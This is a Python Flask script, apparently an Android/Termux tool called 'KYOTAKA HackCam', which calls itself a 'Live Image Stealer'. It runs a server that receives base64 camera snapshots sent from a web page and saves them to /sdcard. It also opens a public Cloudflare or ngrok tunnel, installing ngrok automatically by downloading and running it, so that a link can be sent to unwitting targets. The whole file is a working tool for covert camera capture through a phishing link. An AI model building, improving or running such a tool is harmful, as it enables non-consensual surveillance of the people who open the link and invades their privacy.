from flask import Flask, render_template, request
import os
import base64
import subprocess
import time
import re
import threading

app = Flask(__name__)

def kyotaka_banner():
    os.system('clear')
    print("\033[1;31m")
    print("═══════════════════════════════════════════════")
    print("█▀▀ █▄█ █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ █░░ █░░ █▄▀ ▄▀█")
    print("█▄▄ ░█░ █▄▀ ██▄ █▄█ █▄█ █▀█ █▄▄ █▄▄ █░█ █▀█")
    print("═══════════════════════════════════════════════")
    print("⚡ KYOTAKA HackCam | Live Image Stealer")
    print("🗂️ Dossier de capture : /sdcard/KYOTAKA_HackCam\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    path = '/sdcard/KYOTAKA_HackCam'
    os.makedirs(path, exist_ok=True)
    with open(f'{path}/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

def install_ngrok():
    ngrok_path = os.path.expanduser("~/.ngrok2/ngrok")
    if not (os.path.exists('/data/data/com.termux/files/usr/bin/ngrok') or os.path.exists('/usr/local/bin/ngrok') or os.path.exists('/usr/bin/ngrok')):
        print("\033[1;33m[!] Ngrok non trouvé, installation automatique...\033[0m")
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip -o ngrok.zip")
        os.system("chmod +x ngrok")
        os.system("mv ngrok $PREFIX/bin/")
        os.system("rm ngrok.zip")
        print("\033[1;32m[✓] Ngrok installé avec succès !\033[0m\n")

def start_cloudflared(port):
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        while True:
            line = process.stdout.readline().decode()
            if "trycloudflare.com" in line:
                url_match = re.search(r'(https://.*\.trycloudflare\.com)', line)
                if url_match:
                    print(f"\033[1;32m🔗 Lien public (Cloudflared) : {url_match.group(1)}\033[0m\n")
                    break
            if line == '' and process.poll() is not None:
                break
    except:
        print("\033[1;31mErreur cloudflared\033[0m")

def start_ngrok(port):
    try:
        install_ngrok()
        process = subprocess.Popen(
            ['ngrok', 'http', str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        time.sleep(5)
        tunnel_info = subprocess.check_output(['curl', '-s', 'http://localhost:4040/api/tunnels']).decode()
        url_match = re.search(r'https://[a-zA-Z0-9]+\.ngrok\.io', tunnel_info)
        if url_match:
            print(f"\033[1;32m🔗 Lien public (Ngrok) : {url_match.group(0)}\033[0m\n")
        else:
            print("\033[1;31mÉchec de récupération du lien Ngrok\033[0m")
    except:
        print("\033[1;31mErreur ngrok\033[0m")

if __name__ == '__main__':
    kyotaka_banner()
    print("\033[1;36m[1]\033[0m Cloudflared")
    print("\033[1;36m[2]\033[0m Ngrok\n")
    choix = input("🌐 Choisis ton tunnel (1/2) : ")

    port = 5000
    thread = threading.Thread(target=app.run, kwargs={'port': port})
    thread.daemon = True
    thread.start()
    time.sleep(1)

    if choix == '1':
        start_cloudflared(port)
    elif choix == '2':
        start_ngrok(port)
    else:
        print("\033[1;31mChoix invalide\033[0m")